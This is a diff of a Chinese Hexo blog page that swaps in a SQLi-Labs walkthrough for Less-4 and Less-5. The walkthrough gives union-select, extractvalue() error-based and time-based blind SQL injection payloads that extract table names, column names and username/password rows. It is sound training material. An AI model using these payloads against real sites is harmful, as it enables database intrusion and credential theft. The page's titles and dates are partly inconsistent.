@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>2019-09-11-今日随想 | N00000000B&#39;s Document Blog</title>
-  <meta name="keywords" content>
-  <meta name="description" content="2019-09-11-今日随想 | N00000000B&#39;s Document Blog">
+  <title>2019-09-01-Sqli-Lab1-3 | N00000000B&#39;s Document Blog</title>
+  <meta name="keywords" content=" Web安全 , SQLI-Lab ">
+  <meta name="description" content="2019-09-01-Sqli-Lab1-3 | N00000000B&#39;s Document Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="主要的分类为 1   2   3">
 <meta property="og:type" content="website">
@@ -13,7 +13,7 @@
 <meta property="og:site_name" content="N00000000B&#39;s Document Blog">
 <meta property="og:description" content="主要的分类为 1   2   3">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-09-10T09:24:05.163Z">
+<meta property="og:updated_time" content="2019-09-10T09:24:05.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="分类">
 <meta name="twitter:description" content="主要的分类为 1   2   3">
@@ -127,11 +127,11 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(4)</small></div></li>
+    <li><div class="all active">全部文章<small>(5)</small></div></li>
     
         
             
-            <li><div data-rel="essay">essay<small>(1)</small></div>
+            <li><div data-rel="信息安全">信息安全<small>(2)</small></div>
                 
             </li>
             
@@ -139,7 +139,7 @@
     
         
             
-            <li><div data-rel="信息安全">信息安全<small>(1)</small></div>
+            <li><div data-rel="随笔">随笔<small>(2)</small></div>
                 
             </li>
             
@@ -154,8 +154,8 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="4">
-<input type="hidden" id="yelog_site_word_count" value="766">
+<input type="hidden" id="yelog_site_posts_number" value="5">
+<input type="hidden" id="yelog_site_word_count" value="2.1k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -189,15 +189,19 @@
     <div class="tags-list">
     
     <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">AboutLife</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a href="javascript:" class="color1">Web安全</a>
     </li>
     
     <li class="article-tag-list-item">
         <a href="javascript:" class="color4">SQLI-Lab</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">AboutLife</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">日常生活</a>
     </li>
     
     <div class="clearfix"></div>
@@ -206,7 +210,15 @@
     
     <nav id="title-list-nav">
         
-        <a  class="essay "
+        <a  class="信息安全 "
+           href="/information-security/2019-09-15-Sqli-Lab1-3"
+           data-tag="Web安全,SQLI-Lab"
+           data-author="" >
+            <span class="post-title" title="2019-09-015-Sqli-Lab1-3">2019-09-015-Sqli-Lab1-3</span>
+            <span class="post-date" title="2019-09-15 19:43:13">2019/09/15</span>
+        </a>
+        
+        <a  class="随笔 "
            href="/essay/2019-09-01-My-first-day-in-GitHub-IO"
            data-tag="AboutLife"
            data-author="" >
@@ -214,19 +226,19 @@
             <span class="post-date" title="2019-09-01 19:43:13">2019/09/01</span>
         </a>
         
-        <a  class=""
-           href="/uncategorized/2019-09-11-今日随想"
-           data-tag=""
+        <a  class="随笔 "
+           href="/essay/2019-09-11-今日随想"
+           data-tag="日常生活"
            data-author="" >
-            <span class="post-title" title="2019-09-11-今日随想">2019-09-11-今日随想</span>
-            <span class="post-date" title="2019-09-11 13:19:46">2019/09/11</span>
+            <span class="post-title" title="2019-09-15-今日随想">2019-09-15-今日随想</span>
+            <span class="post-date" title="2019-09-15 22:25:46">2019/09/15</span>
         </a>
         
         <a  class="信息安全 "
-           href="/information-security/2019-09-15-Sqli-Lab1-3"
+           href="/information-security/2019-09-15-Sqli-Lab4-6"
            data-tag="Web安全,SQLI-Lab"
            data-author="" >
-            <span class="post-title" title="2019-09-01-第一天使用GitHub IO">2019-09-01-第一天使用GitHub IO</span>
+            <span class="post-title" title="2019-09-01-Sqli-Lab1-3">2019-09-01-Sqli-Lab1-3</span>
             <span class="post-date" title="2019-09-01 19:43:13">2019/09/01</span>
         </a>
         
@@ -235,7 +247,7 @@
            data-tag=""
            data-author="" >
             <span class="post-title" title="Hello World">Hello World</span>
-            <span class="post-date" title="2019-09-07 15:32:36">2019/09/07</span>
+            <span class="post-date" title="2020-01-20 10:48:51">2020/01/20</span>
         </a>
         
     </nav>
@@ -250,24 +262,38 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-2019-09-11-今日随想" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-2019-09-15-Sqli-Lab4-6" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">2019-09-11-今日随想</h1>
+        <h1 class="article-title">2019-09-01-Sqli-Lab1-3</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            
+                <a href="javascript:" data-rel="信息安全">信息安全</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color1">Web安全</a>
+            
+            <a href="javascript:" class="color4">SQLI-Lab</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-09-11 13:19:46'>2019-09-11 13:19</time>
+        创建时间:<time class="date" title='更新时间: 2019-09-25 10:41:57'>2019-09-01 19:43</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:0</span>
+        <span>字数:1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -286,7 +312,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqli——Lab总结4-6"><span class="toc-text">Sqli——Lab总结4-6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-基于错误的注入-双引号-括号"><span class="toc-text">4.基于错误的注入,双引号+括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-双注入，单引号"><span class="toc-text">5.双注入，单引号</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -301,7 +327,92 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h1 id="Sqli——Lab总结4-6"><a href="#Sqli——Lab总结4-6" class="headerlink" title="Sqli——Lab总结4-6"></a>Sqli——Lab总结4-6</h1><h2 id="4-基于错误的注入-双引号-括号"><a href="#4-基于错误的注入-双引号-括号" class="headerlink" title="4.基于错误的注入,双引号+括号"></a>4.基于错误的注入,双引号+括号</h2><p>主要思路与第三题一致，首先判断错误信息<br><img src="../images/sqli-lab/sqli_lab_less4-1.png" alt="报错信息"></p>
+<p>报错问题为：”-1””) LIMIT 0,1 ，猜测SQL语句为<br>select username，password from table_name where id =(“”) LIMIT 0,1</p>
+<blockquote>
+<p>按照第三题的思路构造 payload，分别提取数据库名，表名，列名，和敏感数据 payload为：id=-1”) union select 1,2,group_concat(username,0x23,password) from users –+</p>
+</blockquote>
+<p>得到的数据为<br><img src="../images/sqli-lab/sqli_lab_less4-2.png" alt="敏感数据"></p>
+<h2 id="5-双注入，单引号"><a href="#5-双注入，单引号" class="headerlink" title="5.双注入，单引号"></a>5.双注入，单引号</h2><p>这道题和之前的基于报错的注入有着明显的区别</p>
+<blockquote>
+<p>尝试构造payload：id=1</p>
+</blockquote>
+<p><img src="../images/sqli-lab/sqli_lab_less5-1.png" alt="报错信息"></p>
+<p>发现无数据输出</p>
+<blockquote>
+<p>尝试构造payload：id=1’</p>
+</blockquote>
+<p>发现错误输出<br><img src="../images/sqli-lab/sqli_lab_less5-2.png" alt="报错信息"><br>报错信息为  ‘1’’ LIMIT 0,1<br>猜测sql语句为单引号的:id=’’ LIMIT 0,1 但对输出有限制</p>
+<p>因此猜测本题需要通过盲注的方法来对数据库的先关信息提取  </p>
+<p>部分特殊函数用法：</p>
+<ul>
+<li><p>Rand()  将输入的值作为随机种子，取得随机数</p>
+</li>
+<li><p>Floor()  向下取整</p>
+</li>
+<li><p>Count()  计数</p>
+</li>
+<li><p>extractvalue(目标xml文档，xml路径)<br>可利用点在第二个xml路径上,xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br>正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</p>
+</li>
+<li><p>UpdateXml(目标xml文档，xml路径，更新的内容)与上面的extractvalue一样，实现的是对xml文档的更新上传。可利用点也是第二个参数</p>
+</li>
+</ul>
+<p>编写相关的时间盲注功能函数<br><img src="../images/sqli-lab/sqli_lab_less5-3.png" alt="基于时间的盲注"></p>
+<blockquote>
+<p>关键payload 为：?id=1’ and if(substr(database(),%d,1)=’%s’,sleep(2),1)<br>其中 %d 为数据库名称的长度，1-100位，%s为0-9，a-z的字符占位。  </p>
+</blockquote>
+<p>得到的相关的数据库名’security’</p>
+<p>除了编写时间盲注的方式，同样也可以通过上述的extractvalue()函数来对信息进行提取</p>
+<blockquote>
+<p>构造payload：id=1’  and (extractvalue(‘1234’,concat(0x23,(select database())))) –+</p>
+</blockquote>
+<p><img src="../images/sqli-lab/sqli_lab_less5-4.png" alt="报错信息"></p>
+<p>然后按照第三题的方式，分别构造提取表名的payload和提取列名的payload</p>
+<blockquote>
+<p>表名payload 为 id=1’  and (extractvalue(‘1234’,concat((select group_concat(0x24,table_name) from information_schema.tables where table_schema = ‘security’)))) –+</p>
+</blockquote>
+<p><img src="../images/sqli-lab/sqli_lab_less5-5.png" alt="报错信息"></p>
+<p>得到敏感表名user  </p>
+<p><strong><font color="Red">此处存在严重问题</font></strong><br>因此extractvalue)_ 和updatexml() 都只能完成32位查询，因此很多内容输出补全。后续虽然可以猜测表名进行补全，但是对数据脱库影响较大。因此这两种方法只执行到这里。  </p>
+<p>既然上述思路不行，再回到最初的报错信息<br><img src="../images/sqli-lab/sqli_lab_less5-2.png" alt="敏感数据"></p>
+<p>我们发现是有Limit限制的，因此，我们考虑构造循环函数来对此进行输出。</p>
+<blockquote>
+<p>循环payload：id=1’  and (extractvalue(‘1234’,concat(0x23,(select table_name from information_schema.tables where table_schema = ‘security’ limit 0,1)))) –+</p>
+</blockquote>
+<p>其中，0，1是循环对象。<br>构造相关函数实现循环，并对网页结果采用正则匹配的方式获取数据</p>
+<p><img src="../images/sqli-lab/sqli_lab_less5-6.png" alt="循环载荷"></p>
+<p>得到以下结果</p>
+<p><img src="../images/sqli-lab/sqli_lab_less5-7.png" alt="结果"></p>
+<p>因此获得敏感数据表名users</p>
+<p>构造获取列名的载荷和获取数据的载荷  </p>
+<blockquote>
+<p>列名载荷：id=1’  and (extractvalue(‘1234’,concat(0x23,(select column_name from information_schema.columns where table_name= ‘users’ limit 0,1)))) –+</p>
+</blockquote>
+<p><img src="../images/sqli-lab/sqli_lab_less5-8.png" alt="结果"></p>
+<p>修改payload 循环输出敏感数据</p>
+<blockquote>
+<p>敏感数据载荷：<br>id=1’  and (extractvalue(‘1234’,concat(0x23,(select concat_ws(0x23,username,password) from security.users limit 0,1)))) –+</p>
+</blockquote>
+<p><img src="../images/sqli-lab/sqli_lab_less5-9.png" alt="结果"></p>
+<p>虽然这道题做到这里就可以说结束了，但是在extractvalue函数在限制输出上确实造成了一些麻烦。因此考虑其他的方式构造攻击载荷。  </p>
+<p>其他方法：  </p>
+<ul>
+<li><p>延迟型盲注：<br>获取表名</p>
+<blockquote>
+<p>构造payload：?id=1’ and if(left((select table_name from information_schema.tables where table_schema=’security’ limit %d,1),%d)=’%s’,SLEEP(4),1) –+  </p>
+</blockquote>
+<p>上述payload中，第一个占位符循环核心payload结果在表中序列，第二个占位符循环表名长度，第三个占位符循环猜测的字符</p>
+<p>获取列名</p>
+<blockquote>
+<p>构造payload：<br>?id=1’ and if(left((select column_name from information_schema.COLUMNs where table_name =’users’ limit %d,1),%d)=’%s’,SLEEP(4),1) –+</p>
+</blockquote>
+<p>数据爆破</p>
+<blockquote>
+<p>构造payload： ?id=1’ and if(left((select password from users order by id limit %d,1),4)=’%s’ ,sleep(4),1)–+</p>
+</blockquote>
+</li>
+</ul>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1004268134@qq.com </span>
     </div>
@@ -314,12 +425,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>2019-09-11-今日随想</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">0</span></p>
+    <p><span class="copy-title">文章标题:</span>2019-09-01-Sqli-Lab1-3</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">1k</span></p>
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="N00000000B">N00000000B</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-09-11, 13:19:46</p>
-    <p><span class="copy-title">最后更新:</span>2019-09-11, 13:19:46</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/uncategorized/2019-09-11-今日随想" title="2019-09-11-今日随想">https://skywalker1997.github.io/uncategorized/2019-09-11-今日随想</a>
+    <p><span class="copy-title">发布时间:</span>2019-09-01, 19:43:13</p>
+    <p><span class="copy-title">最后更新:</span>2019-09-25, 10:41:57</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/information-security/2019-09-15-Sqli-Lab4-6" title="2019-09-01-Sqli-Lab1-3">https://skywalker1997.github.io/information-security/2019-09-15-Sqli-Lab4-6</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
@@ -380,7 +491,7 @@
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#AboutLife','#Web安全','#SQLI-Lab',],
+            'data': ['#Web安全','#SQLI-Lab','#AboutLife','#日常生活',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
